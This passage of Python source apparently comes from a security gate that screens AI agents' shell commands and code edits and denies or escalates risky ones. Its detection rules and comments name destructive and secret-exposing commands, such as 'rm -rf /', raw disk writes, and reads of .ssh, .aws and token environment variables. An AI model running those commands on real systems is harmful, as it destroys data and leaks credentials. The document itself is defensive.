            sinks = all_executors[1:]
            if any(c in _RCE_PIPE_SOURCES for c in sources) and any(c in _RCE_PIPE_SINKS for c in sinks):
                return {
                    "is_safe": False,
                    "allowlisted": False,
                    "unrecognized_commands": all_executors,
                    "findings": ["remote_code_execution_pipe"],
                    "commands": all_executors,
                    "risk_class": "IRREVERSIBLE_DESTRUCTIVE",
                    "protected_path_reads": [],
                    "sensitive_env_access": False,
                    "sensitive_env_vars": [],
                }

    # `eval`/`exec`/`source`/`.` invoked directly (no pipe) execute attacker-controlled
    # argument strings as shell code. Flag as RCE. Checked here (outside the pipe block)
    # so it also fires for standalone `eval "..."`, `source script`, `. ./init.sh`.
    _DIRECT_RCE_BUILTINS = {"eval", "exec", "source"}
    for logical_block in _split_command_pipeline_blocks(cmd):
        for sub_seg in _split_shell_subcommands(logical_block):
            toks = _tokenize_shell_segment(sub_seg)
            prem, _, _, _, _ = _unwrap_shell_prefix(toks)
            eff = prem or toks
            if eff:
                exe0 = os.path.basename(eff[0]).lower().removesuffix(".exe").removesuffix(".com")
                if exe0 in _DIRECT_RCE_BUILTINS or (exe0 == "." and len(eff) > 1):
                    return {
                        "is_safe": False,
                        "allowlisted": False,
                        "unrecognized_commands": [exe0],
                        "findings": ["shell_direct_rce_builtin"],
                        "commands": [exe0],
                        "risk_class": "IRREVERSIBLE_DESTRUCTIVE",
                        "protected_path_reads": [],
                        "sensitive_env_access": False,
                        "sensitive_env_vars": [],
                    }

    subcommands = _split_shell_subcommands(cmd)
    parsed_cmds: List[str] = []
    unrecognized: List[str] = []
    protected_path_reads: List[str] = []
    sensitive_env_vars: List[str] = []
    sensitive_env_access = False

    for sub in subcommands:
        tokens = _tokenize_shell_segment(sub)
        if not tokens:
            continue

        rem_tokens, wrappers_seen, wrapper_findings, bare_env_dump, had_inline_env = _unwrap_shell_prefix(tokens)
        findings.extend(wrapper_findings)

        if bare_env_dump:
            sensitive_env_access = True
            parsed_cmds.append("env")
            unrecognized.append("env")
            continue

        if not rem_tokens:
            if wrappers_seen:
                parsed_cmds.append(wrappers_seen[0])
                unrecognized.append(wrappers_seen[0])
            elif had_inline_env:
                parsed_cmds.append("env_assignment")
                unrecognized.append("env_assignment")
            continue

        exe = os.path.basename(rem_tokens[0]).lower().removesuffix(".exe").removesuffix(".com")
        parsed_cmds.append(exe)
        args = rem_tokens[1:]
        args_lower = [a.lower() for a in args]

        if wrappers_seen or had_inline_env:
            is_safe_analytical_xargs = bool(
                wrappers_seen == ["xargs"]
                and not had_inline_env
                and exe in _SAFE_ANALYTICAL_TOOLS
                and not any(a.startswith(("-I", "-P", "--max-procs", "--replace")) for a in args)
            )
            if not is_safe_analytical_xargs:
                unrecognized.append(wrappers_seen[0] if wrappers_seen else "env_assignment")
        if not _is_command_allowlisted(exe, args, policy=policy):
            unrecognized.append(exe)

        # Bare or secret-targeted environment inspection commands
        if exe == "printenv":
            non_flag_args = [a for a in args if not a.startswith("-")]
            if not non_flag_args:
                sensitive_env_access = True
            elif any(_SENSITIVE_ENV_VAR_RE.search(a) for a in non_flag_args):
                findings.append("shell_sensitive_env_exposure")
                for a in non_flag_args:
                    if _SENSITIVE_ENV_VAR_RE.search(a):
                        sensitive_env_vars.append(a)
            else:
                sensitive_env_access = True
        elif exe in {"set", "export", "declare", "typeset"}:
            non_flag_args = [a for a in args if not a.startswith("-")]
            if not non_flag_args or any("=" not in a for a in non_flag_args):
                sensitive_env_access = True
        elif exe == "compgen" and any("e" in a.lstrip("-") for a in args_lower if a.startswith("-")):
            sensitive_env_access = True

        # Check PowerShell env: drive access and filesystem protected paths across all args
        for a, a_low in zip(args, args_lower):
            if a_low in {"env:", "env:\\", "env:/"}:
                sensitive_env_access = True
            elif a_low.startswith("env:"):
                env_key = a[4:].lstrip("\\/")
                if _SENSITIVE_ENV_VAR_RE.search(env_key):
                    findings.append("shell_sensitive_env_exposure")
                    sensitive_env_vars.append(env_key)
                else:
                    sensitive_env_access = True

            for cand in _extract_candidate_paths_from_arg(a):
                cand_norm = cand.replace("\\", "/")
                if _PROC_ENVIRON_RE.search(cand_norm):
                    findings.append("shell_proc_environ_access")
                    break
                if is_protected_path(cand, policy=policy):
                    if exe in _SHELL_MUTATING_COMMANDS:
                        findings.append("shell_protected_path_mutation")
                    elif exe in _SHELL_SECRET_EGRESS_COMMANDS:
                        findings.append(f"shell_protected_path_egress:{exe}")
                    else:
                        protected_path_reads.append(cand)
                    break

        # Detect unquoted shell variable expansions targeting secret/token names
        for var_name in _extract_unquoted_env_vars(sub):
            if _SENSITIVE_ENV_VAR_RE.search(var_name):
                sensitive_env_vars.append(var_name)
                if exe in _SHELL_SECRET_EGRESS_COMMANDS:
                    findings.append("shell_sensitive_env_exposure")
                else:
                    sensitive_env_access = True

        if exe == "rm":
            has_recursive = any(
                a == "--recursive" or (a.startswith("-") and not a.startswith("--") and ("r" in a or "R" in a))
                for a in args
            )
            dangerous_targets = {"/", "/*", "~", "~/", "$home", "*", "..", "c:\\", "c:/"}
            targets_danger = any(
                a in dangerous_targets
                or a.startswith("~/")
                or a.startswith("/dev/")
                or a.startswith("/etc")
                or (a.startswith("/") and len([seg for seg in a.split("/") if seg]) <= 2)
                or ".." in a.replace("\\", "/").split("/")
                for a in args_lower
                if not a.startswith("-")
            )
            if has_recursive and targets_danger:
                findings.append("destructive_rm_rf")

        elif exe == "dd":
            if any(a.startswith("of=/dev/") or a.startswith("of=\\\\.\\") for a in args_lower):
                findings.append("destructive_raw_disk_write_dd")

        elif exe in {"mkfs", "fdisk", "parted", "wipefs", "diskpart"} or exe.startswith("mkfs."):
            findings.append(f"destructive_disk_format:{exe}")

        elif exe == "format":
            # Only trigger when the command ITSELF is `format`, never `git log --format` or `clang-format`
            findings.append("destructive_disk_format_cmd")

        elif exe in {"del", "erase", "rmdir", "rd"}:
            has_force_rec = any(a in {"/s", "/q", "/f"} for a in args_lower)
            has_root = any(a.startswith(("c:\\", "c:/", "/")) for a in args_lower)
            if has_force_rec or has_root:
                findings.append(f"destructive_delete:{exe}")

        elif exe == "chmod":
            has_777 = any("777" in a or "a+rwx" in a for a in args_lower)
            has_root_or_rec = any(a in {"/", "/*", "-r", "--recursive"} for a in args_lower)
            if has_777 and has_root_or_rec:
                findings.append("dangerous_chmod_777")

        elif exe in {"rg", "ag"}:
            if any(
                a in {"--unrestricted", "--hidden", "--no-ignore", "--no-ignore-dot", "-."}
                or (a.startswith("-") and not a.startswith("--") and "u" in a[1:])
                for a in args_lower
            ):
                protected_path_reads.append("hidden_file_search")

        elif exe in {"grep", "egrep", "fgrep"}:
            has_rec = any(
                a == "--recursive" or (a.startswith("-") and not a.startswith("--") and ("r" in a[1:] or "R" in a[1:]))
                for a in args
            )
            non_flag = [a for a in args if not a.startswith("-")]
            targets_root_or_dot = any(t in {".", "./", "~", "~/"} or t.startswith("/") for t in non_flag[1:])
            if (has_rec and targets_root_or_dot) or any(a.startswith("--include=.") for a in args_lower):
                protected_path_reads.append("hidden_file_search")

        elif exe == "find":
            # Starting points precede the first expression token; `{}` expands to paths under them.
            start_paths: List[str] = []
            for tok in args:
                if tok.startswith(("-", "(", "!", ")")):
                    break
                start_paths.append(tok)
            for idx_arg, a_low in enumerate(args_lower):
                if a_low in {"-name", "-iname", "-path", "-ipath"} and idx_arg + 1 < len(args):
                    if args[idx_arg + 1].lstrip("\"'").startswith("."):
                        protected_path_reads.append("hidden_file_search")
            if "-delete" in args_lower:
                for sp in start_paths:
                    del_res = analyze_shell_command(f"rm -rf {shlex.quote(sp)}", policy=policy)
                    if "destructive_rm_rf" in del_res.get("findings", []):
                        findings.append("destructive_find_delete")
                        break
            for idx_arg, a_low in enumerate(args_lower):
                if a_low in {"-exec", "-execdir", "-ok", "-okdir"}:
                    exec_tokens: List[str] = []
                    for tok in args[idx_arg + 1 :]:
                        if tok in {";", "+", "\\;"}:
                            break
                        if tok == "{}":
                            # Evaluate the executor against the search roots (`find / -exec rm -rf {} +`)
                            exec_tokens.extend(shlex.quote(sp) for sp in start_paths)
                        else:
                            exec_tokens.append(tok)
                    if exec_tokens:
                        inner_res = analyze_shell_command(" ".join(exec_tokens), policy=policy)
                        if not inner_res["is_safe"]:
                            findings.extend(inner_res["findings"])
                        protected_path_reads.extend(inner_res.get("protected_path_reads", []))
                        sensitive_env_vars.extend(inner_res.get("sensitive_env_vars", []))
                        if inner_res.get("sensitive_env_access"):
                            sensitive_env_access = True

        elif exe in {"sh", "bash", "zsh", "dash"}:
            for idx_arg, a in enumerate(args_lower):
                if (a == "-c" or (a.startswith("-") and not a.startswith("--") and "c" in a)) and idx_arg + 1 < len(args):
                    inner_res = analyze_shell_command(args[idx_arg + 1], policy=policy)
                    if not inner_res["is_safe"]:
                        findings.extend(inner_res["findings"])
                    protected_path_reads.extend(inner_res.get("protected_path_reads", []))
                    sensitive_env_vars.extend(inner_res.get("sensitive_env_vars", []))
                    if inner_res.get("sensitive_env_access"):
                        sensitive_env_access = True
                    if not inner_res.get("allowlisted", False):
                        for u in inner_res.get("unrecognized_commands", []):
                            unrecognized.append(u)

        elif exe in {"python", "python3"}:
            for idx_arg, a in enumerate(args_lower):
                has_inline_c = (a == "-c" or (a.startswith("-") and not a.startswith("--") and "c" in a))
                if has_inline_c:
                    inline_code = ""
                    if len(a) > 2 and a.startswith("-") and not a.startswith("--") and not a.endswith("c"):
                        # E.g. -cprint(1)
                        inline_code = a.split("c", 1)[1]
                    elif idx_arg + 1 < len(args):
                        inline_code = args[idx_arg + 1]
                    if inline_code:
                        inline_res = analyze_code_diff("<inline>.py", inline_code)
                        if not inline_res["syntax_valid"] or not inline_res["security_clean"]:
                            findings.extend(f"unsafe_inline_python:{f}" for f in inline_res["findings"])

        elif exe in _INLINE_INTERPRETER_FLAGS:
            eval_flags = _INLINE_INTERPRETER_FLAGS[exe]
            for idx_arg, a in enumerate(args):
                is_eval_flag = a in eval_flags or (
                    exe in {"perl", "ruby"} and a.startswith("-") and not a.startswith("--") and "e" in a.lower()
                )
                if not is_eval_flag or idx_arg + 1 >= len(args):
                    continue
                inline_src = args[idx_arg + 1]
                # Backticks run shell commands in perl/ruby/php (template literals in node are benign)
                has_backtick_exec = exe in {"perl", "ruby", "php"} and "`" in inline_src
                if _INLINE_INTERPRETER_SINK_RE.search(inline_src) or has_backtick_exec:
                    findings.append(f"unsafe_inline_interpreter:{exe}")
                # Shell payloads embedded as string literals (`system("rm -rf /")`)
                for _q, lit in re.findall(r"""(['"])((?:(?!\1).){2,})\1""", inline_src):
                    lit_res = analyze_shell_command(lit, policy=policy)
                    if not lit_res.get("is_safe", True):
                        findings.extend(f"unsafe_inline_interpreter:{f}" for f in lit_res.get("findings", []))
                break

    is_safe = len(findings) == 0
    redirection_requires_escalation = bool(is_safe and unprivileged_redirects)
    dedup_protected = list(dict.fromkeys(protected_path_reads))
    dedup_env_vars = list(dict.fromkeys(sensitive_env_vars))
    allowlisted = bool(
        is_safe
        and parsed_cmds
        and len(unrecognized) == 0
        and not redirection_requires_escalation
        and not dedup_protected
        and not sensitive_env_access
    )
    risk_class = (
        "IRREVERSIBLE_DESTRUCTIVE"
        if not is_safe
        else (
            "READ_ONLY"
            if allowlisted
            else (
                "REVERSIBLE_WRITE"
                if redirection_requires_escalation and not unrecognized and not dedup_protected and not sensitive_env_access
                else "EXTERNAL_ACTION"
            )
        )
    )
    return {
        "is_safe": is_safe,
        "allowlisted": allowlisted,
        "unrecognized_commands": list(dict.fromkeys(unrecognized)),
        "findings": list(dict.fromkeys(findings)),
        "commands": parsed_cmds,
        "risk_class": risk_class,
        "redirection_targets": unprivileged_redirects,
        "redirection_requires_escalation": redirection_requires_escalation,
        "protected_path_reads": dedup_protected,
        "sensitive_env_access": sensitive_env_access,
        "sensitive_env_vars": dedup_env_vars,
    }


def record_decision_journal(entry: Dict[str, Any], journal_path: Optional[Path] = None) -> Dict[str, Any]:
    """Record structured decision telemetry into ring buffer and optional JSONL journal."""
    sanitized = dict(entry)
    if "timestamp" not in sanitized:
        sanitized["timestamp"] = time.time()
    if isinstance(sanitized.get("label"), str):
        sanitized["label"] = redact_secrets(sanitized["label"])
    _DECISION_RING_BUFFER.append(sanitized)
    target = journal_path or DEFAULT_JOURNAL_PATH
    try:
        target.parent.mkdir(parents=True, exist_ok=True)
        is_new = not target.exists()
        with open(target, "a", encoding="utf-8") as f:
            f.write(json.dumps(sanitized, ensure_ascii=False) + "\n")
        if is_new and os.name != "nt":
            os.chmod(target, 0o600)
        return {"written": True, "path": str(target), "error": None}
    except Exception as exc:
        err_str = redact_secrets(f"{type(exc).__name__}:{exc}")
        log.warning("Failed to append decision journal %s: %s", target, err_str)
        return {"written": False, "path": str(target), "error": err_str}


def get_recent_decision_journal(limit: int = 50) -> List[Dict[str, Any]]:
    """Return most recent decision journal records from the in-memory ring buffer."""
    if limit <= 0:
        return []
    return list(_DECISION_RING_BUFFER)[-limit:]


_AGENT_CONTROL_PLANE_SEGMENTS: Tuple[str, ...] = (".claude", ".codex", ".cursor", ".mcp.json", ".vscode")
_AGENT_CREDENTIAL_SEGMENTS: Tuple[str, ...] = (
    ".env", ".ssh", ".aws", ".git", "credentials", "id_rsa", "id_ed25519", "id_ecdsa",
    "secrets", "integrity", "bible.md", "axioms", ".pem", ".key",
)


def _is_agent_control_plane_path(path_str: str) -> bool:
    """True for agent config-plane paths eligible for operator break-glass policy edits."""
    raw = str(path_str or "")
    if not raw or "\x00" in raw:
        return False
    raw_norm = raw.replace("\\", "/").strip().lower()
    raw_segments = [seg for seg in raw_norm.split("/") if seg]
    if ".." in raw_segments:
        return False
    norm = posixpath.normpath(raw_norm)
    norm_segments = [seg for seg in norm.split("/") if seg]
    if ".." in norm_segments:
        return False
    if any(cred in norm for cred in _AGENT_CREDENTIAL_SEGMENTS):
        return False
    return any(seg in _AGENT_CONTROL_PLANE_SEGMENTS for seg in norm_segments)


_DEV_ESCALATE_ONLY_AST_FINDINGS: Set[str] = {
    "subprocess_call:run",
    "subprocess_call:Popen",
    "subprocess_call:call",
    "subprocess_call:check_output",
    "subprocess_call:check_call",
    "dangerous_os_call:os.remove",
    "dangerous_os_call:os.unlink",
}


def decide(
    input_data: Any,
    context: Optional[Dict[str, Any]] = None,
    policy: Optional[PolicyConfig] = None,
) -> Dict[str, Any]:
    """Unified 4-Layer Decision Contract.

    Args:
        input_data: Either a tool/action dict (`{"tool": ..., "path": ..., "diff": ..., "cmd": ...}`)
            or a plain text prompt/query string.
        context: Optional metadata (`available_tools`, `file_content`, `shadow_mode`, `journal_path`, `log_decisions`).
        policy: Optional PolicyConfig instance.

    Returns:
        Dictionary adhering to:
        `{decision, label, prediction_set, reason_code, layer, model_version, rules_version, latency_ms, input_sha256, shadow_mode}`
    """
    t0 = time.perf_counter_ns()
    ctx = context or {}
    cfg = policy or DEFAULT_POLICY

    if isinstance(input_data, dict):
        tool_name = str(input_data.get("tool") or input_data.get("action") or input_data.get("tool_name") or "")
        target_path = input_data.get("path") or input_data.get("file_path")
        diff_text = input_data.get("diff") or input_data.get("payload_diff")
        if diff_text is None and "new_string" in input_data:
            diff_text = str(input_data.get("new_string") or "")
        elif diff_text is None and "content" in input_data:
            diff_text = str(input_data.get("content") or "")
        cmd_str = input_data.get("cmd") or input_data.get("command") or (target_path if tool_name in ("run_command", "execute_shell") else None)
        query_text = str(input_data.get("query") or input_data.get("task_prompt") or "")
        original_source = input_data.get("file_content") or ctx.get("file_content")
        edit_ops = input_data.get("edit_ops")
    else:
        tool_name = str(ctx.get("tool") or "")
        target_path = ctx.get("path")
        diff_text = ctx.get("diff")
        if diff_text is None and "new_string" in ctx:
            diff_text = str(ctx.get("new_string") or "")
        elif diff_text is None and "content" in ctx:
            diff_text = str(ctx.get("content") or "")
        cmd_str = ctx.get("cmd")
        query_text = str(input_data or "")
        original_source = ctx.get("file_content")
        edit_ops = None

    shadow_mode = bool(ctx.get("shadow_mode", False))
    available_tools = ctx.get("available_tools")
    journal_path = Path(ctx["journal_path"]) if ctx.get("journal_path") else None
    should_log = bool(ctx.get("log_decisions", journal_path is not None))

    canonical_payload = json.dumps(
        {"tool": tool_name, "path": target_path, "cmd": cmd_str, "diff": diff_text, "query": query_text},
        sort_keys=True,
        ensure_ascii=False,
        default=str,
    )
    input_sha256 = hashlib.sha256(canonical_payload.encode("utf-8")).hexdigest()[:16]

    clean_tool = str(tool_name or "").strip().lower()
    inferred_risk = TOOL_RISK_CLASSES.get(
        clean_tool,
        "EXTERNAL_ACTION" if (cmd_str or clean_tool) else ("REVERSIBLE_WRITE" if diff_text is not None else "READ_ONLY"),
    )

    diff_structural_context: List[Dict[str, Any]] = []
    pending_taint_record: Optional[Tuple[Any, str, str, bool]] = None

    def _tail_journal_recent(path: Path, limit: int = 12) -> List[Dict[str, Any]]:
        if not path.exists():
            return []
        try:
            with open(path, "rb") as f:
                f.seek(0, 2)
                size = f.tell()
                f.seek(max(0, size - 16384))
                lines = f.read().decode("utf-8", errors="ignore").splitlines()
            items: List[Dict[str, Any]] = []
            for ln in lines[-limit:]:
                ln = ln.strip()
                if not ln:
                    continue
                try:
                    items.append(json.loads(ln))
                except Exception:
                    continue
            return items
        except Exception:
            return []

    def _finish(
        decision: str,
        label: str,
        pred_set: List[str],
        reason_code: str,
        layer: int,
        conformal_bound: Optional[float] = None,
        upper_error_bound: Optional[float] = None,
        calibration_basis: Optional[str] = None,
        verified_episodes: int = 0,
        verified_errors: int = 0,
        confidence_level: Optional[float] = None,
        sample_id: Optional[str] = None,
        decision_kind: Optional[str] = None,
        error_metric: Optional[str] = None,
    ) -> Dict[str, Any]:
        latency_ms = round((time.perf_counter_ns() - t0) / 1_000_000.0, 4)
        recent = list(_DECISION_RING_BUFFER)[-12:]
        if len(recent) < 9 and (journal_path is not None or should_log):
            j_target = journal_path or DEFAULT_JOURNAL_PATH
            disk_recent = _tail_journal_recent(j_target, limit=12)
            if len(disk_recent) > len(recent):
                recent = disk_recent[-12:]
        ood_hits = sum(
            1
            for item in recent
            if str(item.get("shadow_reason_code") or item.get("reason_code") or "") == "layer2_conformal_abstention_ood"
        )
        if reason_code == "layer2_conformal_abstention_ood":
            ood_hits += 1
        denom = max(1, len(recent) + 1)
        drift_detected = bool(denom >= 10 and (ood_hits / float(denom)) > 0.60)
        upper_error_bound_95 = round(float(conformal_bound), 4) if conformal_bound is not None else None
        active_upper_bound = (
            round(float(upper_error_bound), 4)
            if upper_error_bound is not None
            else upper_error_bound_95
        )
        resolved_kind = decision_kind or (
            "structural_gate" if layer in (0, 1) else ("routing_recommendation" if layer == 2 else "fallback_escalation")
        )
        resolved_error_metric = error_metric or (
            "deterministic_structural_rule" if layer in (0, 1) else "unmeasured"
        )

        # Context preview snippet for human review in escalations / audits
        payload_preview: Optional[str] = None
        if cmd_str:
            payload_preview = redact_secrets(str(cmd_str)[:200])
        elif target_path:
            payload_preview = redact_secrets(str(target_path)[:200])
        elif diff_text:
            payload_preview = redact_secrets(str(diff_text)[:200])
        elif query_text:
            payload_preview = redact_secrets(str(query_text)[:200])

        out: Dict[str, Any] = {
            "decision": decision,
            "decision_kind": resolved_kind,
            "authorizes_execution": False,
            "label": redact_secrets(label),
            "payload_preview": payload_preview,
            "prediction_set": pred_set,
            "reason_code": reason_code,
            "layer": layer,
            "model_version": DEFAULT_MODEL_VERSION,
            "rules_version": RULES_VERSION,
            "latency_ms": latency_ms,
            "input_sha256": input_sha256,
            "shadow_mode": shadow_mode,
            "upper_error_bound": active_upper_bound,
            "upper_error_bound_95": upper_error_bound_95,
            "statistical_confidence_status": "verified" if upper_error_bound_95 is not None else "unknown",
            "error_metric": resolved_error_metric,
            "verified_episodes": int(verified_episodes),
            "verified_errors": int(verified_errors),
            "confidence_level": confidence_level,
            "calibration_sample_id": sample_id,
            "calibration_basis": calibration_basis or "deterministic_rule",
            "drift_detected": drift_detected,
        }
        if decision == "escalate":
            # Risk-annotated escalation contract to combat alert fatigue
            if reason_code == "layer1_unrecognized_shell_command_escalate" and label in _SAFE_ANALYTICAL_TOOLS:
                risk_lvl = "LOW"
                risk_assess = f"Analytical/inspection tool '{label}' outside active profile allowlist; no destructive side-effects."
            elif reason_code in ("layer1_shell_redirection_escalate", "layer1_sensitive_env_access_escalate", "layer1_protected_path_shell_read"):
                risk_lvl = "HIGH"
                risk_assess = f"Potentially sensitive shell behavior: {label}"
            elif reason_code == "layer1_diff_scale_exceeded":
                risk_lvl = "HIGH"
                risk_assess = "Diff scale exceeded configured threshold (high blast radius)."
            elif reason_code in ("layer1_ast_syntax_error", "layer1_partial_hunk_without_source"):
                risk_lvl = "MEDIUM"
                risk_assess = f"Syntactic or structural ambiguity: {label}"
            elif reason_code == "layer1_ast_dev_escalate":
                risk_lvl = "MEDIUM"
                risk_assess = f"Process or filesystem call ({label}) in dev profile requires confirmation."
            elif reason_code.startswith("strict_ast_"):
                risk_lvl = "MEDIUM"
                risk_assess = f"Strict AST policy unapproved element: {label}"
            else:
                risk_lvl = "MEDIUM"
                risk_assess = f"Escalated for human confirmation: {label}"

            out["risk_level"] = risk_lvl
            out["risk_assessment"] = risk_assess
            out["escalation_contract"] = {
                "recipient": "human_or_llm_supervisor",
                "timeout_sec": cfg.escalation_timeout_sec,
                "default_on_timeout": cfg.default_on_escalation_timeout,
                "risk_level": risk_lvl,
                "risk_assessment": risk_assess,
            }
        if pending_taint_record is not None and decision != "deny" and not shadow_mode:
            t_sess, t_tool, t_path, t_prot = pending_taint_record
            t_sess.record_pre_tool(t_tool, t_path, t_prot)
        if diff_structural_context:
            out["structural_context"] = diff_structural_context
        if shadow_mode:
            out["shadow_decision"] = decision
            out["shadow_reason_code"] = reason_code
            out["decision"] = "escalate"
            out["reason_code"] = "shadow_mode_observation"

        if should_log:
            j_status = record_decision_journal(out, journal_path=journal_path)
            out["journal_written"] = bool(j_status.get("written", False))
            if j_status.get("error"):
                out["journal_error"] = j_status["error"]
        else:
            _DECISION_RING_BUFFER.append(dict(out))
        return out

    try:
        if ctx.get("_test_fail_layer1"):
            raise RuntimeError("Simulated Layer 1 parser failure")

        # --- Layer 0: Live Registry & Policy Permissions ---
        if available_tools is not None and clean_tool:
            avail_norm = {str(t).strip().lower() for t in available_tools if t}
            if clean_tool not in avail_norm:
                return _finish("deny", clean_tool, ["deny"], "layer0_unregistered_tool", 0)

        l0 = evaluate_layer0_policy(tool_name, target_path, cfg)
        if l0["decision"] == "deny":
            # Break-glass: operator-held env var unlocks policy-plane maintenance only
            # (hook config, skill files). The agent cannot set env vars in the hook
            # process; credential stores (.env, keys, secrets) are never eligible.
            if not (
                os.getenv("AETHERIS_ALLOW_POLICY_EDIT") == "1"
                and _is_agent_control_plane_path(str(l0.get("protected_path") or ""))
            ):
                return _finish("deny", "blocked_policy", ["deny"], l0["reason_code"], 0)
        if l0["decision"] == "escalate":
            return _finish("escalate", "requires_confirmation", ["escalate", "deny"], l0["reason_code"], 0)

        # Optional cross-turn SessionSecurityState taint guard
        sess_obj = ctx.get("session_state")
        sess_path = ctx.get("session_state_path")
        if sess_obj is not None or sess_path:
            from .mcp_security import SessionSecurityState

            sess = sess_obj if isinstance(sess_obj, SessionSecurityState) else SessionSecurityState(Path(str(sess_path)))
            is_egress_or_mutation = (
                clean_tool
                in {
                    "execute_shell",
                    "run_command",
                    "write_file",
                    "repo_write",
                    "edit_file",
                    "str_replace_editor",
                    "apply_patch",
                    "delete_file",
                    "web_fetch",
                    "http_request",
                    "git_push",
                    "git_commit",
                }
                or cmd_str is not None
                or diff_text is not None
                or any(k in clean_tool for k in ("fetch", "post", "http", "curl", "upload", "send", "exec", "shell", "write", "edit", "mcp"))
            )
            taint_res = sess.evaluate_taint_gate(clean_tool, is_egress_or_mutation=is_egress_or_mutation)
            if taint_res["decision"] == "deny":
                return _finish("deny", taint_res["label"], ["deny"], taint_res["reason_code"], 0)
            if taint_res["decision"] == "escalate":
                return _finish("escalate", taint_res["label"], ["escalate", "deny"], taint_res["reason_code"], 0)
            pending_taint_record = (sess, clean_tool, str(target_path or ""), is_protected_path(target_path, cfg))

        # --- Layer 1: Structural AST, Secret Egress & Allowlist-First Shell Parsers ---
        if any(isinstance(val, str) and "\x00" in val for val in (target_path, cmd_str, diff_text, query_text)):
            return _finish("deny", "null_byte_in_input", ["deny"], "layer1_null_byte_veto", 1)

        egress_secret_types = _scan_outbound_secret_egress(
            input_data,
            cmd_str=cmd_str,
            query_text=query_text,
            target_path=target_path,
            skip_diff_fields=(diff_text is not None),
        )
        if egress_secret_types:
            return _finish(
                "deny",
                f"secret_egress_detected:{egress_secret_types[0]}",
                ["deny"],
                "layer1_secret_egress_veto",
                1,
            )

        if cmd_str:
            sh_res = analyze_shell_command(cmd_str, policy=cfg)
            if not sh_res["is_safe"]:
                return _finish("deny", sh_res["findings"][0], ["deny"], "layer1_shell_parser_veto", 1)
            if sh_res.get("protected_path_reads"):
                return _finish(
                    "escalate",
                    "protected_path_shell_read",
                    ["allow", "deny"],
                    "layer1_protected_path_shell_read_escalate",
                    1,
                )
            if sh_res.get("sensitive_env_access"):
                return _finish(
                    "escalate",
                    "sensitive_env_access",
                    ["allow", "deny"],
                    "layer1_sensitive_env_access_escalate",
                    1,
                )
            if sh_res.get("redirection_requires_escalation"):
                return _finish(
                    "escalate",
                    "shell_output_redirection",
                    ["allow", "deny"],
                    "layer1_shell_redirection_escalate",
                    1,
                )
            if not sh_res.get("allowlisted", False):
                unrec = sh_res.get("unrecognized_commands", [])
                return _finish(
                    "escalate",
                    unrec[0] if unrec else "unrecognized_shell_command",
                    ["allow", "deny"],
                    "layer1_unrecognized_shell_command_escalate",
                    1,
                )

        hunk_only_checked = False
        if diff_text is not None:
            is_hunk_without_source = (
                original_source is None
                and ("@@" in diff_text or diff_text.lstrip().startswith(("diff --git", "--- ", "+++ ")))
            )
            diff_res = analyze_code_diff(target_path, diff_text, original_source=original_source, edit_ops=edit_ops)
            diff_structural_context.extend(diff_res.get("structural_context", []))
            if not diff_res["security_clean"]:
                if (
                    str(cfg.profile or "strict").strip().lower() == "dev"
                    and diff_res["findings"]
                    and all(f in _DEV_ESCALATE_ONLY_AST_FINDINGS for f in diff_res["findings"])
                ):
                    return _finish("escalate", diff_res["findings"][0], ["allow", "deny"], "layer1_ast_dev_escalate", 1)
                return _finish("deny", diff_res["findings"][0], ["deny"], "layer1_ast_security_veto", 1)
            if not diff_res["syntax_valid"]:
                if diff_res.get("partial_hunk_needs_source"):
                    return _finish("escalate", "partial_hunk_without_source", ["allow", "deny"], "layer1_partial_hunk_without_source", 1)
                return _finish("deny", "syntax_error", ["deny"], "layer1_ast_syntax_error", 1)
            if diff_res["line_count"] > cfg.max_diff_lines:
                return _finish("escalate", "high_blast_radius", ["allow", "deny"], "layer1_diff_scale_exceeded", 1)
            if is_hunk_without_source and cfg.require_full_source_for_allow:
                return _finish("escalate", "partial_hunk_without_source", ["allow", "deny"], "layer1_partial_hunk_without_source", 1)
            if is_hunk_without_source:
                hunk_only_checked = True
            if cfg.strict_ast_allowlist and diff_res.get("language") == "python":
                allowed_mods = set(cfg.allowed_ast_imports)
                unapproved = [m for m in diff_res.get("imported_modules", []) if m not in allowed_mods]
                if unapproved:
                    return _finish(
                        "escalate",
                        f"strict_ast_unapproved_import:{unapproved[0]}",
                        ["allow", "deny"],
                        "layer1_strict_ast_allowlist_escalate",
                        1,
                    )
                dyn_calls = diff_res.get("dynamic_calls", [])
                if dyn_calls:
                    return _finish(
                        "escalate",
                        f"strict_ast_dynamic_call:{dyn_calls[0]}",
                        ["allow", "deny"],
                        "layer1_strict_ast_allowlist_escalate",
                        1,
                    )

        # Only allow at Layer 1 when the payload was actually inspected (cmd/diff)
        # or the tool is an explicit READ_ONLY tool; uninspected/external tools escalate.
        if tool_name and not query_text:
            is_verified = bool(cmd_str) or (diff_text is not None) or (TOOL_RISK_CLASSES.get(clean_tool) == "READ_ONLY")
            if is_verified:
                ok_code = "layer1_hunk_only_checked" if hunk_only_checked else "layer1_structural_verified"
                return _finish("allow", tool_name, [tool_name], ok_code, 1)
            return _finish("escalate", tool_name, ["allow", "deny"], "layer1_uninspected_tool", 1)

    except Exception as exc:
        if inferred_risk in ("EXTERNAL_ACTION", "IRREVERSIBLE_DESTRUCTIVE") or cmd_str or diff_text is not None:
            return _finish("deny", "layer1_error", ["deny"], f"layer1_fail_closed:{type(exc).__name__}", 1)
        return _finish("escalate", "layer1_error", [], f"layer1_escalate_on_error:{type(exc).__name__}", 1)

    # --- Layer 2: Calibrated Soft Classifier & Conformal Prediction Set ---
    if query_text:
        try:
            from .tool_routing_moe import get_tool_routing_moe
            moe = get_tool_routing_moe()
            moe_res = moe.route(query_text, available_tools=available_tools)
            cal_rep = moe.calibration_report() if hasattr(moe, "calibration_report") else {}
            cal_bound_95 = cal_rep.get("upper_error_bound_95")
            cal_bound_active = cal_rep.get("upper_error_bound")
            verified_eps = int(cal_rep.get("verified_episodes", 0) or 0)
            verified_errs = int(cal_rep.get("verified_errors", 0) or 0)
            conf_level = cal_rep.get("confidence_level")
            sample_id = cal_rep.get("sample_id")
            err_metric = cal_rep.get("error_metric")
            if cal_rep.get("recalibrated") and verified_eps > 0:
                cal_basis = "recalibrated_journal"
            elif verified_eps > 0:
                cal_basis = "measured_holdout"
            elif cal_rep.get("calibration_basis"):
                cal_basis = str(cal_rep["calibration_basis"])
            else:
                cal_basis = "uncalibrated_unknown"
            if not moe_res.conformal_passed:
                return _finish(
                    "escalate",
                    moe_res.selected_tool,
                    [moe_res.selected_tool, moe_res.secondary_tool],
                    "layer2_conformal_abstention_ood",
                    2,
                    conformal_bound=cal_bound_95,
                    upper_error_bound=cal_bound_active,
                    calibration_basis=cal_basis,
                    verified_episodes=verified_eps,
